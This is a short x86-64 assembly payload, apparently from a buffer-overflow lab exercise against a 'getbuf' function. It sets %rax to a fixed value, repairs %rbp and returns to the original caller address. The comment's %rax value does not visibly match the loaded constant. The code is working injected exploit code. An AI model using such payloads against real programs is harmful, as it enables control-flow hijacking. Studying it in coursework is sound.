# %rax=55677510
# getbuf returns to 0x401542
# buf size 0x210

mov  $0x50f536ac, %rax 
mov  %rsp, %rbp        
add  $0x10, %rbp       
push $0x401542         
ret                    